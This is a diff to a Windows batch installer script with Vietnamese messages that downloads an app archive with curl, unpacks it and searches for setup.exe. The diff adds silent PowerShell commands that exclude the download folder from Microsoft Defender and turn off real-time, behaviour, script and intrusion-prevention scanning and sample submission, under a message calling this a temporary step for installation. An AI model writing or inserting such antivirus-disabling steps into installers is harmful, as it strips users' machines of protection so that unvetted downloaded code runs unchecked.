@@ -675,6 +675,11 @@ if defined foundPath (
 echo:     %W%[==^> Dang tai %appName%...]%Res%
 if not exist "%source%" md "%source%"
 curl --ssl-no-revoke --progress-bar -L -# -o "%source%\app.zip" "%downloadURL%"
+
+echo:     %W%[==^> Tam tat Antivirus de chay cai dat...]%Res%
+powershell -Command "Add-MpPreference -ExclusionPath '%source%'" >nul 2>&1
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -SubmitSamplesConsent 2" >nul 2>&1
+
 echo:     %W%[==^> Dang giai nen va cai dat...]%Res%
 powershell -Command "Expand-Archive -Path '%source%\app.zip' -DestinationPath '%source%' -Force"
 echo:     %W%[==^> Dang tim file setup.exe trong cac thu muc con...]%Res%
